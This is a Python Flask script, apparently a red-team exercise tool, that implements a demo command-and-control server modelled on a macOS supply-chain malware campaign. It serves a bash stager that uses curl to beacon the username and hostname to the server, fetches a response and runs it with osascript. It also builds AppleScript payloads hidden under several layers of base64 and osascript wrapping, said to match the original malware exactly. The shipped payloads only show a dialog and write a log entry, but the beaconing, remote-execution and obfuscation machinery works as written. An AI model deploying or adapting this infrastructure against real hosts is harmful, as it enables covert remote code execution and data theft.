#!/usr/bin/env python3
"""
RED TEAM DEMO - C2 Server
=========================
This is a DEMONSTRATION C2 server for educational purposes only.
It simulates the command & control infrastructure used in supply chain attacks.

NOW WITH REALISTIC OBFUSCATION matching the original malware:
- Multi-layer base64 encoding (5+ layers)
- Recursive osascript execution
- Exact format from PCAP analysis

Usage:
    python3 c2_server.py [--port PORT] [--host HOST]
    python3 c2_server.py --layers 5  # Set obfuscation layers

The server provides:
    - Beacon reception endpoint (/s/<beacon_id>)
    - Payload staging endpoint (/p/<payload_id>)
    - Initial stager endpoint (/a)
    - Admin dashboard (/admin)
"""

import argparse
import base64
import json
import logging
import os
import sys
from datetime import datetime
from pathlib import Path

try:
    from flask import Flask, request, jsonify, render_template_string
except ImportError:
    print("[!] Flask not installed. Run: pip install flask")
    sys.exit(1)

# Configuration
app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)

# Global config (set via CLI args)
OBFUSCATION_LAYERS = 5

# In-memory storage for demo
beacons = []
payloads_served = []

# Logging setup
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

# ============================================================================
# OBFUSCATION FUNCTIONS - Matches original malware exactly
# ============================================================================

def base64_encode_layer(data: str) -> str:
    """Single layer base64 encode."""
    return base64.b64encode(data.encode('utf-8')).decode('utf-8')


def generate_recursive_applescript(payload: str, layers: int = 5) -> str:
    """
    Generate recursive AppleScript payload with multi-layer base64.
    
    This EXACTLY matches the original malware format:
    try
        do shell script "osascript -e \"$(echo <base64> | base64 -D)\""
    end try
    
    Each layer wraps the previous in base64 and osascript execution.
    """
    current = payload
    
    for i in range(layers):
        # Base64 encode current payload
        encoded = base64_encode_layer(current)
        
        # Wrap in osascript execution - EXACT original format
        current = f'''try
    do shell script "osascript -e \\"$(echo {encoded} | base64 -D)\\""
end try'''
    
    return current


def obfuscate_payload(name: str, payload: str) -> str:
    """Apply full obfuscation chain to a payload."""
    return generate_recursive_applescript(payload, OBFUSCATION_LAYERS)


# ============================================================================
# DEMO PAYLOADS - SAFE payloads with realistic obfuscation
# ============================================================================

# Inner payloads (what actually executes - SAFE demo versions)
INNER_PAYLOADS = {
    "looz": '''try
    display dialog "RED TEAM DEMO" & return & return & "Payload 'looz' executed!" & return & "User: " & (do shell script "whoami") & return & "Host: " & (do shell script "hostname") with title "Supply Chain Attack Demo" buttons {"OK"} default button "OK" with icon caution
    do shell script "mkdir -p /tmp/redteam_demo && echo '[DEMO] looz payload executed at $(date) by $(whoami)' >> /tmp/redteam_demo/activity.log"
end try''',
    
    "cozfi": '''try
    display dialog "RED TEAM DEMO" & return & return & "Payload 'cozfi' executed!" & return & "User: " & (do shell script "whoami") & return & "Host: " & (do shell script "hostname") with title "Supply Chain Attack Demo" buttons {"OK"} default button "OK" with icon caution
    do shell script "mkdir -p /tmp/redteam_demo && echo '[DEMO] cozfi payload executed at $(date) by $(whoami)' >> /tmp/redteam_demo/activity.log"
end try''',
    
    "jez": '''try
    display dialog "RED TEAM DEMO" & return & return & "Payload 'jez' executed!" & return & "User: " & (do shell script "whoami") & return & "Host: " & (do shell script "hostname") with title "Supply Chain Attack Demo" buttons {"OK"} default button "OK" with icon caution
    do shell script "mkdir -p /tmp/redteam_demo && echo '[DEMO] jez payload executed at $(date) by $(whoami)' >> /tmp/redteam_demo/activity.log"
end try''',
    
    "xcode": '''try
    display dialog "RED TEAM DEMO" & return & return & "Xcode Build Script Payload!" & return & "Your build process was compromised." & return & return & "User: " & (do shell script "whoami") & return & "Host: " & (do shell script "hostname") with title "Supply Chain Attack - Xcode" buttons {"OK"} default button "OK" with icon caution
    do shell script "mkdir -p /tmp/redteam_demo && echo '[DEMO] xcode payload executed at $(date) by $(whoami)' >> /tmp/redteam_demo/activity.log"
end try''',
    
    "default": '''try
    display dialog "RED TEAM DEMO" & return & return & "Default payload executed!" & return & "User: " & (do shell script "whoami") with title "Supply Chain Attack Demo" buttons {"OK"} default button "OK" with icon caution
    do shell script "mkdir -p /tmp/redteam_demo && echo '[DEMO] default payload executed at $(date)' >> /tmp/redteam_demo/activity.log"
end try'''
}

# Cache for obfuscated payloads (generated on first request)
OBFUSCATED_PAYLOADS = {}

# ============================================================================
# ADMIN DASHBOARD
# ============================================================================

ADMIN_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>RED TEAM C2 - Demo Dashboard</title>
    <style>
        body { 
            font-family: 'Courier New', monospace; 
            background: #1a1a2e; 
            color: #0f0; 
            padding: 20px; 
            margin: 0;
        }
        .header { 
            text-align: center; 
            border-bottom: 2px solid #0f0; 
            padding-bottom: 20px; 
            margin-bottom: 20px;
        }
        .header h1 { color: #f00; margin: 0; }
        .header p { color: #ff0; }
        .stats { 
            display: flex; 
            justify-content: space-around; 
            margin-bottom: 30px;
        }
        .stat-box {
            background: #16213e;
            padding: 20px;
            border: 1px solid #0f0;
            border-radius: 5px;
            text-align: center;
            min-width: 150px;
        }
        .stat-box h2 { margin: 0; font-size: 2em; color: #0ff; }
        .stat-box p { margin: 5px 0 0 0; color: #888; }
        table { 
            width: 100%; 
            border-collapse: collapse; 
            margin-top: 20px;
        }
        th, td { 
            border: 1px solid #333; 
            padding: 10px; 
            text-align: left; 
        }
        th { background: #16213e; color: #0ff; }
        tr:hover { background: #16213e; }
        .section { margin-top: 30px; }
        .section h3 { color: #ff0; border-bottom: 1px solid #333; padding-bottom: 10px; }
        .warning {
            background: #4a0000;
            border: 2px solid #f00;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        .refresh-btn {
            background: #0f0;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-family: inherit;
        }
    </style>
    <meta http-equiv="refresh" content="10">
</head>
<body>
    <div class="warning">
        FOR EDUCATIONAL/DEMO PURPOSES ONLY - RED TEAM VS BLUE TEAM EXERCISE
    </div>
    
    <div class="header">
        <h1>RED TEAM C2 SERVER</h1>
        <p>Supply Chain Attack Demonstration Dashboard</p>
    </div>
    
    <div class="stats">
        <div class="stat-box">
            <h2>{{ beacon_count }}</h2>
            <p>Total Beacons</p>
        </div>
        <div class="stat-box">
            <h2>{{ unique_hosts }}</h2>
            <p>Unique Hosts</p>
        </div>
        <div class="stat-box">
            <h2>{{ payloads_served }}</h2>
            <p>Payloads Served</p>
        </div>
    </div>
    
    <div class="section">
        <h3>Recent Beacons</h3>
        <table>
            <tr>
                <th>Timestamp</th>
                <th>Beacon ID</th>
                <th>Username</th>
                <th>Platform</th>
                <th>Source IP</th>
                <th>Data</th>
            </tr>
            {% for beacon in beacons[-20:]|reverse %}
            <tr>
                <td>{{ beacon.timestamp }}</td>
                <td>{{ beacon.beacon_id }}</td>
                <td>{{ beacon.username }}</td>
                <td>{{ beacon.platform }}</td>
                <td>{{ beacon.source_ip }}</td>
                <td>{{ beacon.raw_data[:50] }}...</td>
            </tr>
            {% endfor %}
        </table>
    </div>
    
    <div class="section">
        <h3>Available Payloads (Multi-layer Base64 Obfuscated)</h3>
        <table>
            <tr>
                <th>Payload ID</th>
                <th>Endpoint</th>
                <th>Obfuscation</th>
                <th>Description</th>
            </tr>
            <tr><td>looz</td><td>/s/looz</td><td>{{ layers }}-layer base64</td><td>Demo payload - displays dialog</td></tr>
            <tr><td>cozfi</td><td>/s/cozfi</td><td>{{ layers }}-layer base64</td><td>Demo payload - displays dialog</td></tr>
            <tr><td>jez</td><td>/s/jez</td><td>{{ layers }}-layer base64</td><td>Demo payload - displays dialog</td></tr>
            <tr><td>xcode</td><td>/s/xcode</td><td>{{ layers }}-layer base64</td><td>Xcode build script payload</td></tr>
            <tr><td>stager</td><td>/a</td><td>Shell script</td><td>Initial stager (curl target)</td></tr>
        </table>
    </div>
    
    <div class="section">
        <h3>Obfuscation Details</h3>
        <p style="color:#0ff;">Payload Format (matches original malware):</p>
        <pre style="background:#16213e;padding:10px;border:1px solid #333;">
try
    do shell script "osascript -e \"$(echo &lt;BASE64_LAYER_N&gt; | base64 -D)\""
end try

# Each layer wraps the previous in base64 + osascript
# Current config: {{ layers }} layers of encoding
        </pre>
    </div>
    
    <div class="section">
        <h3>Server Info</h3>
        <p>Server Time: {{ server_time }}</p>
        <p>Listening: {{ host }}:{{ port }}</p>
        <p>Obfuscation Layers: {{ layers }}</p>
    </div>
</body>
</html>
'''

# ============================================================================
# ROUTES
# ============================================================================

@app.route('/')
def index():
    """Redirect to admin dashboard"""
    return '''
    <html>
    <head><title>Demo C2</title></head>
    <body style="background:#1a1a2e;color:#0f0;font-family:monospace;text-align:center;padding-top:100px;">
        <h1 style="color:#f00;">RED TEAM C2 SERVER</h1>
        <p>Supply Chain Attack Demo</p>
        <p><a href="/admin" style="color:#0ff;">Access Admin Dashboard</a></p>
    </body>
    </html>
    '''

@app.route('/admin')
def admin():
    """Admin dashboard showing all beacons and payloads"""
    unique_hosts = len(set(b.get('source_ip', 'unknown') for b in beacons))
    
    return render_template_string(
        ADMIN_TEMPLATE,
        beacons=beacons,
        beacon_count=len(beacons),
        unique_hosts=unique_hosts,
        payloads_served=len(payloads_served),
        server_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        host=request.host.split(':')[0],
        port=request.host.split(':')[1] if ':' in request.host else '8888',
        layers=OBFUSCATION_LAYERS
    )

@app.route('/s/<beacon_id>', methods=['GET', 'POST'])
def beacon_handler(beacon_id):
    """
    Handle incoming beacons from compromised hosts.
    Mimics the original C2 behavior: receives check-in, returns payload.
    
    Expected POST data: p=<platform>&u=<username>&a=<additional_data>
    """
    beacon_data = {
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'beacon_id': beacon_id,
        'source_ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', 'unknown'),
        'method': request.method,
        'platform': 'unknown',
        'username': 'unknown',
        'raw_data': ''
    }
    
    # Parse POST data if present
    if request.method == 'POST':
        raw = request.get_data(as_text=True)
        beacon_data['raw_data'] = raw
        
        # Parse form data: p=platform&u=username&a=additional
        if request.form:
            beacon_data['platform'] = request.form.get('p', 'unknown')
            beacon_data['username'] = request.form.get('u', 'unknown')
            beacon_data['additional'] = request.form.get('a', '')
    
    # Log the beacon
    beacons.append(beacon_data)
    logger.info(f"[BEACON] {beacon_id} from {beacon_data['source_ip']} "
                f"(user: {beacon_data['username']}, platform: {beacon_data['platform']})")
    
    # Get or generate obfuscated payload
    if beacon_id not in OBFUSCATED_PAYLOADS:
        inner = INNER_PAYLOADS.get(beacon_id, INNER_PAYLOADS['default'])
        OBFUSCATED_PAYLOADS[beacon_id] = obfuscate_payload(beacon_id, inner)
    
    payload = OBFUSCATED_PAYLOADS[beacon_id]
    
    payloads_served.append({
        'timestamp': datetime.now().isoformat(),
        'beacon_id': beacon_id,
        'target_ip': request.remote_addr,
        'payload_size': len(payload)
    })
    
    logger.info(f"[PAYLOAD] Serving obfuscated '{beacon_id}' payload ({len(payload)} bytes) to {request.remote_addr}")
    
    return payload, 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/a')
def initial_stager():
    """
    Initial stager endpoint - matches original /a endpoint.
    Returns a shell script that sets up persistence and beacons.
    """
    host = request.host
    stager = f'''#!/bin/bash
# Initial stager - downloaded via curl -fskL
mkdir -p /tmp/redteam_demo
echo "[STAGER] Initial stager executed at $(date)" >> /tmp/redteam_demo/activity.log

# Beacon to C2
USER=$(whoami)
HOST=$(hostname)
TS=$(date +%s)

curl -s -X POST "http://{host}/s/stager" \\
    -d "p=macos&u=$USER&a=$TS,$TS,0,0" \\
    -o /tmp/.o.txt 2>/dev/null

# Execute response
if [ -f /tmp/.o.txt ] && [ -s /tmp/.o.txt ]; then
    osascript /tmp/.o.txt 2>/dev/null
fi
'''
    logger.info(f"[STAGER] Initial stager downloaded by {request.remote_addr}")
    return stager, 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/p/<payload_id>')
def payload_download(payload_id):
    """Serve staged payloads for download (obfuscated)"""
    if payload_id not in OBFUSCATED_PAYLOADS:
        inner = INNER_PAYLOADS.get(payload_id, INNER_PAYLOADS['default'])
        OBFUSCATED_PAYLOADS[payload_id] = obfuscate_payload(payload_id, inner)
    
    payload = OBFUSCATED_PAYLOADS[payload_id]
    
    logger.info(f"[DOWNLOAD] Obfuscated payload '{payload_id}' ({len(payload)} bytes) downloaded by {request.remote_addr}")
    
    return payload, 200, {
        'Content-Type': 'text/plain; charset=utf-8',
        'Content-Disposition': f'attachment; filename="{payload_id}.applescript"'
    }

@app.route('/raw/<payload_id>')
def raw_payload(payload_id):
    """Serve raw (non-obfuscated) payloads for debugging"""
    payload = INNER_PAYLOADS.get(payload_id, INNER_PAYLOADS['default'])
    return payload, 200, {'Content-Type': 'text/plain; charset=utf-8'}

@app.route('/api/beacons')
def api_beacons():
    """JSON API endpoint for beacon data"""
    return jsonify({
        'count': len(beacons),
        'beacons': beacons[-100:]  # Last 100 beacons
    })

@app.route('/api/stats')
def api_stats():
    """JSON API endpoint for statistics"""
    unique_hosts = len(set(b.get('source_ip', 'unknown') for b in beacons))
    unique_users = len(set(b.get('username', 'unknown') for b in beacons))
    
    return jsonify({
        'total_beacons': len(beacons),
        'unique_hosts': unique_hosts,
        'unique_users': unique_users,
        'payloads_served': len(payloads_served)
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'ok', 'timestamp': datetime.now().isoformat()})

# ============================================================================
# MAIN
# ============================================================================

def main():
    global OBFUSCATION_LAYERS
    
    parser = argparse.ArgumentParser(
        description='RED TEAM DEMO - C2 Server for Supply Chain Attack Simulation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
    python3 c2_server.py                    # Run on localhost:8888
    python3 c2_server.py --port 9999        # Run on custom port
    python3 c2_server.py --host 0.0.0.0     # Listen on all interfaces
    python3 c2_server.py --layers 7         # More obfuscation layers
    
Endpoints:
    /admin          - Web dashboard
    /a              - Initial stager (curl -fskL http://c2/a)
    /s/<id>         - Beacon handler (POST beacons here, returns obfuscated payload)
    /p/<id>         - Payload download (obfuscated)
    /raw/<id>       - Raw payload (for debugging)
    /api/beacons    - JSON beacon data
    /api/stats      - JSON statistics
        '''
    )
    parser.add_argument('--port', type=int, default=8888, help='Port to listen on (default: 8888)')
    parser.add_argument('--host', default='127.0.0.1', help='Host to bind to (default: 127.0.0.1)')
    parser.add_argument('--layers', type=int, default=5, help='Base64 obfuscation layers (default: 5)')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    
    args = parser.parse_args()
    
    # Set global obfuscation level
    OBFUSCATION_LAYERS = args.layers
    
    print("""
    ╔══════════════════════════════════════════════════════════════╗
    ║                    RED TEAM C2 SERVER                        ║
    ║              Supply Chain Attack Demonstration               ║
    ║                                                              ║
    ║         NOW WITH REALISTIC MULTI-LAYER OBFUSCATION           ║
    ╠══════════════════════════════════════════════════════════════╣
    ║  FOR EDUCATIONAL PURPOSES ONLY - RED TEAM VS BLUE TEAM       ║
    ╚══════════════════════════════════════════════════════════════╝
    """)
    
    logger.info(f"Starting C2 server on {args.host}:{args.port}")
    logger.info(f"Obfuscation layers: {OBFUSCATION_LAYERS}")
    logger.info(f"Admin dashboard: http://{args.host}:{args.port}/admin")
    logger.info(f"Initial stager: curl -fskL http://{args.host}:{args.port}/a")
    logger.info(f"Beacon endpoint: http://{args.host}:{args.port}/s/<beacon_id>")
    
    app.run(host=args.host, port=args.port, debug=args.debug)

if __name__ == '__main__':
    main()
